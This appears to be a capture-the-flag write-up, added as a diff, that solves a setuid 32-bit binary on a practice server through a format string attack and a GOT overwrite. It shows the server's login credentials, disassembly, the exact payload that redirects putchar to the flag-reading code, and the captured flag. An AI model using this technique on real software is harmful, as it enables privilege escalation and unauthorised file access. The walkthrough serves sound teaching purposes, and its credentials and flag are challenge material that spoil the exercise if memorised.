@@ -1,0 +1,286 @@
+'''
+SSH: ctfq.sweetduet.info:10022
+ID: q4
+Pass: q60SIMpLlej9eq49
+'''
+
+'''
+ssh -p 10022 q4@ctfq.sweetduet.info
+'''
+
+'''
+[q4@localhost ~]$ pwd
+/home/q4
+[q4@localhost ~]$ ls -la
+total 36
+drwxr-xr-x.  2 root root 4096 May 22  2012 .
+drwxr-xr-x. 17 root root 4096 Oct  6  2014 ..
+-rw-r--r--.  1 root root   18 Dec  2  2011 .bash_logout
+-rw-r--r--.  1 root root  176 Dec  2  2011 .bash_profile
+-rw-r--r--.  1 root root  124 Dec  2  2011 .bashrc
+-r--------.  1 q4a  q4a    22 May 22  2012 flag.txt
+-rwsr-xr-x.  1 q4a  q4a  5857 May 22  2012 q4
+-rw-r--r--.  1 root root  151 Jun  1  2012 readme.txt
+'''
+
+'''
+[q4@localhost ~]$ cat flag.txt
+cat: flag.txt: Permission denied
+
+[q4@localhost ~]$ cat readme.txt
+You are not allowed to connect internet and write the home directory.
+If you need temporary directory, use /tmp.
+Sometimes this machine will be reset.
+'''
+
+'''
+4@localhost ~]$ file q4
+q4: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.18, not stripped
+'''
+
+q4 is 32bit ELF binary and this is the file we need to analyze. Let's execute it.
+
+'''
+[q4@localhost ~]$ ./q4
+What's your name?
+hoge
+Hi, hoge
+
+Do you want the flag?
+yes
+Do you want the flag?
+hogefuga
+Do you want the flag?
+no
+I see. Good bye.
+'''
+
+q4 does the following:
+
+1. Asks username
+2. Then ask if you want the flag
+3. If you answer "no", the program ends. Else the program keep asks if you want the flag no matter what your answer is. strcmp is used for comparison.
+
+The remote server supports tools and commands like readelf, objdump and gdb so you can analyze the file remotely.
+
+'''
+[q4@localhost ~]$ which readelf
+/usr/bin/readelf
+[q4@localhost ~]$ which objdump
+/usr/bin/objdump
+[q4@localhost ~]$ which gdb
+/usr/bin/gdb
+'''
+
+You can also download the file using scp command.
+
+'''
+scp -P 10022 q4@ctfq.sweetduet.info:/home/q4/q4 [/download/path/at/local]
+'''
+
+I downloaded the file to local machine and disassembled the file with IDA and identified the following code:
+
+'''
+.text:0804860D C7 84 24 18 04 00 00 01 00 00 00 mov     dword ptr [esp+418h], 1 ; what if I can overwrite this value to 0?
+.text:08048618 EB 67                            jmp     short loc_8048681
+---
+.text:08048681 8B 84 24 18 04 00 00             mov     eax, [esp+418h]
+.text:08048688 85 C0                            test    eax, eax
+.text:0804868A 0F 95 C0                         setnz   al              ; set byte if not zero
+.text:0804868D 84 C0                            test    al, al
+.text:0804868F 75 89                            jnz     short loc_804861A
+---
+.text:08048691 C7 44 24 04 E6 87 04 08          mov     dword ptr [esp+4], offset aR ; "r"
+.text:08048699 C7 04 24 E8 87 04 08             mov     dword ptr [esp], offset aFlagTxt ; "flag.txt"
+.text:080486A0 E8 FF FD FF FF                   call    _fopen
+'''
+
+The above code indicates that if I can set the value at esp+0x418 from 1 to 0, the program jumps to fopen function which reads the flag from flag.txt; however, the address of esp changes upon execution and I was unable to predict the address of esp hence had to think of other approach.
+
+Eventually, I found that the program is vulnerable to format string attack.
+
+'''
+[q4@localhost ~]$ ./q4
+What's your name?
+%p, %p, %p, %p, %p
+Hi, 0x400, 0x3bd8c0, 0x8, 0x14, 0xbedfc4
+
+Do you want the flag?
+'''
+
+"%p" is a format specifier to print pointer address. Notice that program is printing weird hex values.
+
+Let's check the code.
+
+'''
+.text:080485B4 55                               push    ebp
+.text:080485B5 89 E5                            mov     ebp, esp
+.text:080485B7 83 E4 F0                         and     esp, 0FFFFFFF0h
+.text:080485BA 81 EC 20 04 00 00                sub     esp, 420h
+.text:080485C0 C7 04 24 A4 87 04 08             mov     dword ptr [esp], offset aWhatSYourName ; "What's your name?"
+.text:080485C7 E8 F8 FE FF FF                   call    _puts
+.text:080485CC A1 04 9A 04 08                   mov     eax, ds:stdin@@GLIBC_2_0
+.text:080485D1 89 44 24 08                      mov     [esp+8], eax    ; pointer to a FILE object that identifies the stream where characters are read from
+.text:080485D5 C7 44 24 04 00 04 00 00          mov     dword ptr [esp+4], 400h ; maximum number of characters to be read
+.text:080485DD 8D 44 24 18                      lea     eax, [esp+18h]  ; pointer to an array of chars where the string read is stored
+.text:080485E1 89 04 24                         mov     [esp], eax
+.text:080485E4 E8 9B FE FF FF                   call    _fgets
+.text:080485E9 C7 04 24 B6 87 04 08             mov     dword ptr [esp], offset aHi ; "Hi, "
+.text:080485F0 E8 BF FE FF FF                   call    _printf         ; print Hi,
+.text:080485F5 8D 44 24 18                      lea     eax, [esp+18h]
+.text:080485F9 89 04 24                         mov     [esp], eax
+.text:080485FC E8 B3 FE FF FF                   call    _printf         ; print name
+.text:08048601 C7 04 24 0A 00 00 00             mov     dword ptr [esp], 0Ah
+.text:08048608 E8 67 FE FF FF                   call    _putchar        ; print new line
+'''
+
+There are two printf functions. First printf prints "Hi" and the second printf prints username read from standard input. Notice that the second printf only takes one argument which is a username read from standard input and there is no argument for format specifier.
+
+Since there is no hard coded format specifier, user can input arbitrary format specifier and leak the contents from stack.
+
+'''
+[q4@localhost ~]$ ./q4
+What's your name?
+AAAA%p, %p, %p, %p, %p, %p, %p,
+Hi, AAAA0x400, 0xe878c0, 0x8, 0x14, 0x71cfc4, 0x41414141, 0x202c7025,
+'''
+
+Notice that 6th "%p" stores "AAAA" (0x41414141). This means 6th "%p" (which is 7th argument from stack) stores buffer for standard input. You can write arbitrary memory address to this buffer and read/write data. I will go through this later.
+
+Upon further research, I found that you can combine format string attack and GOT Overwrite to pwn eip.
+GOT stands for Global Offset Table and it stores address for shared libraries. When the program uses shared library, it does not directly call the library but use GOT as a reference to dynamically resolve functions that are located in shared libraries.
+
+Let's see example. Below is putchar called from q4.
+
+'''
+[q4@localhost ~]$ objdump -d -M intel q4 | grep putchar
+08048474 <putchar@plt>:
+ 8048608:	e8 67 fe ff ff       	call   8048474 <putchar@plt>
+'''
+
+It jumps to 0x80499e0
+
+'''
+[q4@localhost ~]$ objdump -d -M intel q4 | grep 8048474
+08048474 <putchar@plt>:
+ 8048474:	ff 25 e0 99 04 08    	jmp    DWORD PTR ds:0x80499e0
+''' 
+
+Which is pointing to GOT
+
+'''
+[q4@localhost ~]$ objdump -s q4 | grep -A 5 '.got.plt'
+Contents of section .got.plt:
+ 80499d0 ec980408 00000000 00000000 6a840408  ............j...
+ 80499e0 7a840408 8a840408 9a840408 aa840408  z...............
+ 80499f0 ba840408 ca840408 da840408 ea840408  ................
+'''
+
+GOT will dynamically resolve the address of putchar function and will write to 0x80499e0.
+
+When the program is No RELRO or Partial RELRO, GOT is writable. (RELRO stands for RELocation ReadOnly).
+
+q4 is "No RELRO" (commands from https://www.trapkit.de/tools/checksec.html)
+
+'''
+[q4@localhost ~]$ readelf -l q4 | grep GNU_RELRO
+[q4@localhost ~]$
+'''
+
+Hence, GOT is writable.
+
+'''
+[q4@localhost ~]$ readelf -S q4 | grep got
+  [22] .got              PROGBITS        080499cc 0009cc 000004 04  WA  0   0  4
+  [23] .got.plt          PROGBITS        080499d0 0009d0 000030 04  WA  0   0  4
+'''
+
+Functions resolved by GOT is as below.
+
+'''
+[q4@localhost ~]$ readelf -r q4
+
+Relocation section '.rel.dyn' at offset 0x3cc contains 2 entries:
+ Offset     Info    Type            Sym.Value  Sym. Name
+080499cc  00000106 R_386_GLOB_DAT    00000000   __gmon_start__
+08049a04  00000b05 R_386_COPY        08049a04   stdin
+
+Relocation section '.rel.plt' at offset 0x3dc contains 9 entries:
+ Offset     Info    Type            Sym.Value  Sym. Name
+080499dc  00000107 R_386_JUMP_SLOT   00000000   __gmon_start__
+080499e0  00000307 R_386_JUMP_SLOT   00000000   putchar
+080499e4  00000407 R_386_JUMP_SLOT   00000000   fgets
+080499e8  00000507 R_386_JUMP_SLOT   00000000   __libc_start_main
+080499ec  00000607 R_386_JUMP_SLOT   00000000   fopen
+080499f0  00000707 R_386_JUMP_SLOT   00000000   printf
+080499f4  00000807 R_386_JUMP_SLOT   00000000   puts
+080499f8  00000c07 R_386_JUMP_SLOT   080484d4   __gxx_personality_v0
+080499fc  00000907 R_386_JUMP_SLOT   00000000   strcmp
+'''
+
+Above indicates that the address of putchar will be dynamically resolved by GOT and will be written to 0x080499e0. If we can overwrite the address within 0x80499e0 then the program will jump to that address whenever putchar is called. We can use format string attack to write arbitrary address to 0x80499e0.
+
+Below is the exploit payload to overwrite address of putchar (0x80499e0) to point 0x08048691. (0x08048691 is a beginning of fopen function which reads flag.txt)
+
+'''
+\xe0\x99\x04\x08%134514317x%6$n
+'''
+
+This format is called direct parameter access. It tells printf function to write the value "0x08048691" to specified address, in this case, to 0x80499e0. I will go through each parts.
+
+'''
+\xe0\x99\x04\x08
+'''
+
+The target address which we want to overwrite its value.
+
+'''
+%134514317x%6$n
+'''
+
+"n" is a format specifier which will count number of bytes printed so far by printf and store into specified address. "n" writes 4bytes, "hn" writes 2bytes and "hhn" writes 1byte. 
+"%6" represents 7th argument from stack where the buffer for standard input is stored. This case, "\xe0\x99\x04\x08" is stored at %6
+
+'''
+[q4@localhost ~]$ echo -e '\xe0\x99\x04\x08%6$x' | ./q4
+What's your name?
+Hi, 80499e0
+'''
+
+"%134514317x" represents "0x804868d". (x is a format specifier) 
+
+I want to write the value "0x08048691" then why have I wrote "0x804868d"? This is because '\xe0\x99\x04\x08', which is 4bytes, are already printed and stored. So I had to subtract 4 from "0x08048691" which is "0x804868d".
+
+'''
+>>> 0x08048691 - 4
+134514317
+>>> hex(134514317)
+'0x804868d'
+'''
+
+Put in all together, "\xe0\x99\x04\x08%134514317x%6$n" will overwrite the value at the address 0x80499e0 to "0x08048691"
+
+'''
+[q4@localhost ~]$ echo -e '\xe0\x99\x04\x08%134514317x%6$n' | ./q4 | grep -i flag
+FLAG_nwW6eP503Q3QI0zw
+'''
+
+## About format string attack
+https://www.ipa.go.jp/security/awareness/vendor/programmingv2/contents/c906.html
+https://kusano-k.hatenadiary.com/entry/20140302/1393781714
+https://ptr-yudai.hatenablog.com/entry/2018/10/06/234120
+
+## About direct parameter access
+https://kevinalmansa.github.io/application%20security/Format-Strings/
+https://braddaniels.org/format-string-vulns/
+
+## About RELRO and GOT Overwrite
+https://medium.com/@HockeyInJune/relro-relocation-read-only-c8d0933faef3
+
+## reference for important terms
+https://raintrees.net/projects/a-painter-and-a-black-cat/wiki/CTF_Pwn#CTF-Pwn
+
+## how to get base address for libc
+https://security.stackexchange.com/questions/178006/how-to-leak-libc-base-address-using-format-string-exploit
+https://ptr-yudai.hatenablog.com/entry/2019/01/21/142126
+https://www.ret2rop.com/2018/08/format-string-defeating-stack-canary-nx-aslr-remote.html
